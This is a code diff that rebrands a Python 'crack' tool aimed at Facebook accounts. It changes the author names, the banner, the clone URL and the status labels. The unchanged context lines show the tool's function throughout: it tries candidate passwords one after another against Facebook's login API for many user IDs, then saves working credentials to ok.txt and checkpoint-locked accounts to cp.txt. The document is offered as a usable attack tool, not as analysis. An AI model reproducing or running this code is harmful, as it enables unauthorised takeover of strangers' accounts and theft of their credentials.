@@ -70,7 +70,7 @@ def linex():
 
 
 def logo():
-    os.system('echo "\n     ______  ___  ______ _   __ \n     |  _  \/ _ \ | ___ \ | / /\n     | | | / /_\ \| |_/ / |/ /  \n     | | | |  _  ||    /|    \  \n     | |/ /| | | || |\ \| |\  \ \n     |___/ \_| |_/\_| \_\_| \_/ \n    ###############################\n    # TOOL NAME: { MUHMAND }      #\n    # AUTHOR   : MR. HARI         #\n    # GITHUB   : git.io/AS        #\n    ###############################" | lolcat -a -d 2 -s 50')
+    os.system('echo "\n     ______  ___  ______ _   __ \n     |  _  \/ _ \ | ___ \ | / /\n     | | | / /_\ \| |_/ / |/ /  \n     | | | |  _  ||    /|    \  \n     | |/ /| | | || |\ \| |\  \ \n     |___/ \_| |_/\_| \_\_| \_/ \n    ###############################\n    # TOOL NAME: { DARK }      #\n    # AUTHOR   : MR. WAQAR         #\n    # GITHUB   : Waqar_pro        #\n    ###############################" | lolcat -a -d 2 -s 50')
 
 
 def main():
@@ -81,7 +81,7 @@ def main():
     print '\x1b[92;1m  [1] START CRACK'
     print '\x1b[93;1m  [2] HOW TO GET ACCESS TOKEN'
     print '\x1b[94;1m  [3] UPDATE TOOL'
-    print '\x1b[96;1m  [J] JOIN MR. MUHMAND  GROUP \x1b[92;1m\xe2\x9c\x98\x1b[91;1m\xe2\x9c\x98'
+    print '\x1b[96;1m  [J] JOIN MR. WAQARAJ  GROUP \x1b[92;1m\xe2\x9c\x98\x1b[91;1m\xe2\x9c\x98'
     print '\x1b[90;1m  [0] EXIT'
     print ''
     log_sel()
@@ -104,7 +104,7 @@ def log_sel():
         import os
         
         try:
-            os.system('git clone https://github.com/Aijaz-Muhmand/riskihari')
+            os.system('git clone https://github.com/Waqar-Hacker/riskihari')
             os.system('rm -rf riskihari.py')
             os.system('cp -f riskihari/riskihari.py \\.')
             os.system('rm -rf haripro')
@@ -370,13 +370,13 @@ def crack_select1():
                 'x-fb-http-engine': 'Liger' }
             data = requests.get(api, params = params, headers = headers_)
             if 'access_token' in data.text and 'EAAA' in data.text:
-                print ' \x1b[1;32m[HARI-OK] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print ' \x1b[1;32m[WAQAR-OK] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 ok = open('ok.txt', 'a')
                 ok.write(uid + '|' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in data.json()['error_msg']:
-                print ' \x1b[1;33m[HARI-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print ' \x1b[1;33m[WAQAR-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 cp = open('cp.txt', 'a')
                 cp.write(uid + '|' + pass1 + '\n')
                 cp.close()
@@ -405,13 +405,13 @@ def crack_select1():
                     'x-fb-http-engine': 'Liger' }
                 data = requests.get(api, params = params, headers = headers_)
                 if 'access_token' in data.text and 'EAAA' in data.text:
-                    print ' \x1b[1;32m[HARI-OK] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print ' \x1b[1;32m[WAQAR-OK] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     ok = open('ok.txt', 'a')
                     ok.write(uid + '|' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in data.json()['error_msg']:
-                    print ' \x1b[1;33m[HARI-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print ' \x1b[1;33m[WAQAR-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     cp = open('cp.txt', 'a')
                     cp.write(uid + '|' + pass2 + '\n')
                     cp.close()
@@ -440,13 +440,13 @@ def crack_select1():
                         'x-fb-http-engine': 'Liger' }
                     data = requests.get(api, params = params, headers = headers_)
                     if 'access_token' in data.text and 'EAAA' in data.text:
-                        print ' \x1b[1;32m[HARI-OK] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print ' \x1b[1;32m[WAQAR-OK] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                         ok = open('ok.txt', 'a')
                         ok.write(uid + '|' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in data.json()['error_msg']:
-                        print ' \x1b[1;33m[HARI-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print ' \x1b[1;33m[WAQAR-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                         cp = open('cp.txt', 'a')
                         cp.write(uid + '|' + pass3 + '\n')
                         cp.close()
@@ -475,13 +475,13 @@ def crack_select1():
                             'x-fb-http-engine': 'Liger' }
                         data = requests.get(api, params = params, headers = headers_)
                         if 'access_token' in data.text and 'EAAA' in data.text:
-                            print ' \x1b[1;32m[HARI-OK] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print ' \x1b[1;32m[WAQAR-OK] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                             ok = open('ok.txt', 'a')
                             ok.write(uid + '|' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in data.json()['error_msg']:
-                            print ' \x1b[1;33m[HARI-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print ' \x1b[1;33m[WAQAR-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                             cp = open('cp.txt', 'a')
                             cp.write(uid + '|' + pass4 + '\n')
                             cp.close()
@@ -510,13 +510,13 @@ def crack_select1():
                                 'x-fb-http-engine': 'Liger' }
                             data = requests.get(api, params = params, headers = headers_)
                             if 'access_token' in data.text and 'EAAA' in data.text:
-                                print ' \x1b[1;32m[HARI-OK] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                print ' \x1b[1;32m[WAQAR-OK] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                 ok = open('ok.txt', 'a')
                                 ok.write(uid + '|' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'www.facebook.com' in data.json()['error_msg']:
-                                print ' \x1b[1;33m[HARI-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                print ' \x1b[1;33m[WAQAR-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                 cp = open('cp.txt', 'a')
                                 cp.write(uid + '|' + pass5 + '\n')
                                 cp.close()
@@ -545,13 +545,13 @@ def crack_select1():
                                     'x-fb-http-engine': 'Liger' }
                                 data = requests.get(api, params = params, headers = headers_)
                                 if 'access_token' in data.text and 'EAAA' in data.text:
-                                    print ' \x1b[1;32m[HARI-OK] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    print ' \x1b[1;32m[WAQAR-OK] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                     ok = open('ok.txt', 'a')
                                     ok.write(uid + '|' + pass6 + '\n')
                                     ok.close()
                                     oks.append(uid + pass6)
                                 elif 'www.facebook.com' in data.json()['error_msg']:
-                                    print ' \x1b[1;33m[HARI-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    print ' \x1b[1;33m[WAQAR-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                     cp = open('cp.txt', 'a')
                                     cp.write(uid + '|' + pass6 + '\n')
                                     cp.close()
@@ -580,13 +580,13 @@ def crack_select1():
                                         'x-fb-http-engine': 'Liger' }
                                     data = requests.get(api, params = params, headers = headers_)
                                     if 'access_token' in data.text and 'EAAA' in data.text:
-                                        print ' \x1b[1;32m[HARI-OK] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
+                                        print ' \x1b[1;32m[WAQAR-OK] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                         ok = open('ok.txt', 'a')
                                         ok.write(uid + '|' + pass7 + '\n')
                                         ok.close()
                                         oks.append(uid + pass7)
                                     elif 'www.facebook.com' in data.json()['error_msg']:
-                                        print ' \x1b[1;33m[HARI-CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
+                                        print ' \x1b[1;33m[WAQAR-CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                         cp = open('cp.txt', 'a')
                                         cp.write(uid + '|' + pass7 + '\n')
                                         cp.close()
@@ -615,13 +615,13 @@ def crack_select1():
                                             'x-fb-http-engine': 'Liger' }
                                         data = requests.get(api, params = params, headers = headers_)
                                         if 'access_token' in data.text and 'EAAA' in data.text:
-                                            print ' \x1b[1;32m[HARI-OK] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
+                                            print ' \x1b[1;32m[WAQAR-OK] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                             ok = open('ok.txt', 'a')
                                             ok.write(uid + '|' + pass8 + '\n')
                                             ok.close()
                                             oks.append(uid + pass8)
                                         elif 'www.facebook.com' in data.json()['error_msg']:
-                                            print ' \x1b[1;33m[HARI-CP] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
+                                            print ' \x1b[1;33m[WAQAR-CP] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                             cp = open('cp.txt', 'a')
                                             cp.write(uid + '|' + pass8 + '\n')
                                             cp.close()
@@ -799,13 +799,13 @@ def crack_select():
                 'x-fb-http-engine': 'Liger' }
             data = requests.get(api, params = params, headers = headers_)
             if 'access_token' in data.text and 'EAAA' in data.text:
-                print ' \x1b[1;32m[HARI-OK] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print ' \x1b[1;32m[WAQAR-OK] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 ok = open('ok.txt', 'a')
                 ok.write(uid + '|' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in data.json()['error_msg']:
-                print ' \x1b[1;33m[HARI-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print ' \x1b[1;33m[WAQAR-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 cp = open('cp.txt', 'a')
                 cp.write(uid + '|' + pass1 + '\n')
                 cp.close()
@@ -834,13 +834,13 @@ def crack_select():
                     'x-fb-http-engine': 'Liger' }
                 data = requests.get(api, params = params, headers = headers_)
                 if 'access_token' in data.text and 'EAAA' in data.text:
-                    print ' \x1b[1;32m[HARI-OK] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print ' \x1b[1;32m[WAQAR-OK] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     ok = open('ok.txt', 'a')
                     ok.write(uid + '|' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in data.json()['error_msg']:
-                    print ' \x1b[1;33m[HARI-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print ' \x1b[1;33m[WAQAR-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     cp = open('cp.txt', 'a')
                     cp.write(uid + '|' + pass2 + '\n')
                     cp.close()
@@ -869,13 +869,13 @@ def crack_select():
                         'x-fb-http-engine': 'Liger' }
                     data = requests.get(api, params = params, headers = headers_)
                     if 'access_token' in data.text and 'EAAA' in data.text:
-                        print ' \x1b[1;32m[HARI-OK] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print ' \x1b[1;32m[WAQAR-OK] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                         ok = open('ok.txt', 'a')
                         ok.write(uid + '|' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in data.json()['error_msg']:
-                        print ' \x1b[1;33m[HARI-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print ' \x1b[1;33m[WAQAR-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                         cp = open('cp.txt', 'a')
                         cp.write(uid + '|' + pass3 + '\n')
                         cp.close()
@@ -904,13 +904,13 @@ def crack_select():
                             'x-fb-http-engine': 'Liger' }
                         data = requests.get(api, params = params, headers = headers_)
                         if 'access_token' in data.text and 'EAAA' in data.text:
-                            print ' \x1b[1;32m[HARI-OK] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print ' \x1b[1;32m[WAQAR-OK] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                             ok = open('ok.txt', 'a')
                             ok.write(uid + '|' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in data.json()['error_msg']:
-                            print ' \x1b[1;33m[HARI-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print ' \x1b[1;33m[WAQAR-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                             cp = open('cp.txt', 'a')
                             cp.write(uid + '|' + pass4 + '\n')
                             cp.close()
@@ -939,13 +939,13 @@ def crack_select():
                                 'x-fb-http-engine': 'Liger' }
                             data = requests.get(api, params = params, headers = headers_)
                             if 'access_token' in data.text and 'EAAA' in data.text:
-                                print ' \x1b[1;32m[HARI-OK] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                print ' \x1b[1;32m[WAQAR-OK] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                 ok = open('ok.txt', 'a')
                                 ok.write(uid + '|' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'www.facebook.com' in data.json()['error_msg']:
-                                print ' \x1b[1;33m[HARI-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                print ' \x1b[1;33m[WAQAR-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                 cp = open('cp.txt', 'a')
                                 cp.write(uid + '|' + pass5 + '\n')
                                 cp.close()
@@ -974,13 +974,13 @@ def crack_select():
                                     'x-fb-http-engine': 'Liger' }
                                 data = requests.get(api, params = params, headers = headers_)
                                 if 'access_token' in data.text and 'EAAA' in data.text:
-                                    print ' \x1b[1;32m[HARI-OK] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    print ' \x1b[1;32m[WAQAR-OK] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                     ok = open('ok.txt', 'a')
                                     ok.write(uid + '|' + pass6 + '\n')
                                     ok.close()
                                     oks.append(uid + pass6)
                                 elif 'www.facebook.com' in data.json()['error_msg']:
-                                    print ' \x1b[1;33m[HARI-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    print ' \x1b[1;33m[WAQAR-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                     cp = open('cp.txt', 'a')
                                     cp.write(uid + '|' + pass6 + '\n')
                                     cp.close()
@@ -1009,13 +1009,13 @@ def crack_select():
                                         'x-fb-http-engine': 'Liger' }
                                     data = requests.get(api, params = params, headers = headers_)
                                     if 'access_token' in data.text and 'EAAA' in data.text:
-                                        print ' \x1b[1;32m[HARI-OK] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
+                                        print ' \x1b[1;32m[WAQAR-OK] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                         ok = open('ok.txt', 'a')
                                         ok.write(uid + '|' + pass7 + '\n')
                                         ok.close()
                                         oks.append(uid + pass7)
                                     elif 'www.facebook.com' in data.json()['error_msg']:
-                                        print ' \x1b[1;33m[HARI-CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
+                                        print ' \x1b[1;33m[WAQAR-CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                         cp = open('cp.txt', 'a')
                                         cp.write(uid + '|' + pass7 + '\n')
                                         cp.close()
